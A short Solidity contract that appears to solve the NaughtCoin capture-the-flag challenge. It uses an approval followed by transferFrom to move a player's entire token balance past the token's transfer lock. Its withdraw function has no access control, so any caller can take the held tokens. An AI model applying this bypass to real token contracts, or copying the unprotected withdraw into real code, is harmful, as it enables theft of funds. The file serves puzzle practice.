// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract NaughtCoinHack {
    function attack(address _naughtCoin, address _player) external {
        INaughtCoin naughtCoin = INaughtCoin(_naughtCoin);
        uint256 balance = naughtCoin.balanceOf(_player);
        
        // First get approval (must be done by player separately)
        // Then transferFrom
        naughtCoin.transferFrom(_player, address(this), balance);
    }
    
    // To return funds if needed
    function withdraw(address _naughtCoin) external {
        INaughtCoin naughtCoin = INaughtCoin(_naughtCoin);
        naughtCoin.transfer(msg.sender, naughtCoin.balanceOf(address(this)));
    }
}